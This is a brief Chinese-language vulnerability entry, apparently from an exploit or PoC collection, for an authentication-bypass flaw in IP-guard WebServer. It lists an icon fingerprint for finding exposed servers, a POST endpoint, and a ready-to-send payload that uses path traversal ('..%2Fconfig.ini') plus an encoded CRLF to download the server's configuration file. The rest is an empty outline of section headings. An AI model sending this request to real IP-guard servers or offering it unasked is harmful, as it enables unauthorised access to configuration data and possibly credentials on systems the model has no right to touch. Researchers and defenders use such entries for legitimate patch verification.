# IP-guardWebServer权限绕过漏洞

- **系统**：IP-guardWebServer　|　**类型**：认证/授权绕过　|　**CVE**：—
- **指纹**：`web.icon=="210a3c89d4ab5effa18d6dd7a9627376"`
- **请求**：`POST /ipg/appr/MApplyList/downloadFile_client/getdatarecord HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 64`

**请求体 / payload**
```
path=..%2Fconfig.ini&filename=1&action=download&hidGuid=1v%0D%0A
```

**其他**
- IP-guard WebServer 权限绕过漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * IP-guard